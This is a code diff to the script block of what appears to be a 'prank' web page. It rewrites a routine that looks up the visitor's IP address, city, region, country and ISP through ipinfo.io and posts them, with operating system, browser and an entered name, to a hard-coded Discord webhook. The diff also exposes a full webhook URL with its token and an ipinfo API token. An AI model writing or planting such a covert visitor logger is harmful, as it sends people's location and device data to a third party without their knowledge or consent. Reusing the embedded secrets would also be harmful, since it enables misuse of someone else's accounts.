@@ -113,39 +113,94 @@
     window.onload = typeLine;
   </script>
   <script>
+    const IPname = sessionStorage.getItem('prankName') || 'You';
     const discord = "https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl";
-      fetch("https://ipinfo.io/json?token=a90f18c2f503dc")
-        .then(response => response.json())
-        .then(data => {
-          const message = `🌐 New visitor:
-      - IP: ${data.ip}
-      - OS: ${getOS}
-      - City: ${data.city}
-      - Region: ${data.region}
-      - Country: ${data.country}
-      - ISP: ${data.org}
-      - Time: ${new Date().toLocaleString()}`;
-      
-          fetch(discord, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ content: message })
-          });
+// Function to get the Operating System from the user agent string
+    function getOS() {
+      let userAgent = window.navigator.userAgent;
 
-          function getOS() {
-            let userAgent = window.navigator.userAgent;
-          
-            if (userAgent.indexOf("Win") !== -1) return "Windows";
-            if (userAgent.indexOf("Mac") !== -1) return "macOS";
-            if (userAgent.indexOf("X11") !== -1) return "UNIX";
-            if (userAgent.indexOf("Linux") !== -1) return "Linux";
-          
-            return "Unknown OS";
-          }
+      if (userAgent.indexOf("Win") !== -1) return "Windows";
+      if (userAgent.indexOf("Mac") !== -1) return "macOS";
+      if (userAgent.indexOf("X11") !== -1) return "UNIX";
+      if (userAgent.indexOf("Linux") !== -1) return "Linux";
+      return "Unknown OS";
+    }
+
+    // Function to get the browser name and version
+    function getBrowser() {
+      let userAgent = window.navigator.userAgent;
+      let browser = "Unknown Browser";
+
+      if (userAgent.indexOf("Chrome") !== -1) {
+        browser = "Google Chrome";
+      } else if (userAgent.indexOf("Firefox") !== -1) {
+        browser = "Mozilla Firefox";
+      } else if (userAgent.indexOf("Safari") !== -1) {
+        browser = "Apple Safari";
+      } else if (userAgent.indexOf("Edge") !== -1) {
+        browser = "Microsoft Edge";
+      }
+      return browser;
+    }
+
+    // Function to get the user's IP and location using ipinfo.io
+    function getIPInfo() {
+      return fetch('https://ipinfo.io/json?token=a90f18c2f503dc')
+        .then(res => res.json())
+        .then(data => {
+          return {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            isp: data.org
+          };
         });
-      
+    }
+
+    function sendToDiscord(data) {
+      const webhookUrl = discord
+      const payload = {
+        content: `Device Info Logged:\n
+        **Name**: ${IPname}\n
+        **IP Address**: ${data.ip}\n
+        **Location**: ${data.city}, ${data.region}, ${data.country}\n
+        **ISP**: ${data.isp}\n
+        **Operating System**: ${data.os}\n
+        **Browser**: ${data.browser}`
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => console.log('Successfully sent to Discord:', data))
+      .catch(error => console.error('Error sending to Discord:', error));
+    }
+
+    // Main function that logs and sends the device info
+    function logDeviceInfo() {
+      const os = getOS();
+      const browser = getBrowser();
+      getIPInfo().then(ipInfo => {
+        const deviceInfo = {
+          os: os,
+          browser: browser,
+          ip: ipInfo.ip,
+          city: ipInfo.city,
+          region: ipInfo.region,
+          country: ipInfo.country,
+          isp: ipInfo.isp
+        };
+
+        console.log(deviceInfo); // Output to console (optional)
+        sendToDiscord(deviceInfo); // Send to Discord
+      });
+    }
   </script>
 </body>
 </html>
